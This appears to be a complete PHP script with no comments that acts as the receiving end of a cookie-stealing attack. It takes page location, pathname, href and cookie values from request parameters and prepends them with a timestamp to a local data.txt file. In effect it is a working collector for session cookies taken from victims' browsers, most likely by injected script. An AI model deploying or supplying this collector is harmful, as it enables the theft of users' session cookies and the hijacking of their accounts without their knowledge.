<?php
	$new_contents='
	'.
	'time: '.date('r').'
	'
	.'location: '.$_REQUEST['xlocation'].'
	'
	.'pathname: '.$_REQUEST['xpathname'].'
	'
	.'href: '.$_REQUEST['xhref'].'
	'
	.'cookie: '.$_REQUEST['xcookie'].'
	';
	$file = "data.txt"; 
	$fh = fopen($file,'r+'); 
	$contents = fread($fh,filesize($file)); 
	$contents=$new_contents.$contents;
	fclose($fh); 
	$fh = fopen($file, 'r+'); 
	fwrite($fh,$contents); 
	fclose($fh); 
?>